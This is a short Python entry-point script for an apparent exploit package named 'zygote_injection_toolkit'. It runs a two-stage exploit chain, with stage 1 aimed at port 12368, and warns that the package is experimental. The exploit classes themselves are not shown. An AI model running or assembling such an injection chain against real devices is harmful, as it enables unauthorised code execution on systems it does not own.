import sys

from zygote_injection_toolkit.stage1 import Stage1Exploit
from zygote_injection_toolkit.stage2 import Stage2Exploit


def main() -> None:
    print("This package is very experimental!")
    stage_1_exploit: Stage1Exploit = Stage1Exploit(port = 12368)
    if not stage_1_exploit.exploit_stage1():
        print("Stage 1 failed!", file=sys.stderr)
    state_2_exploit: Stage2Exploit = Stage2Exploit()
    state_2_exploit.exploit_stage2()


if __name__ == "__main__":
    main()
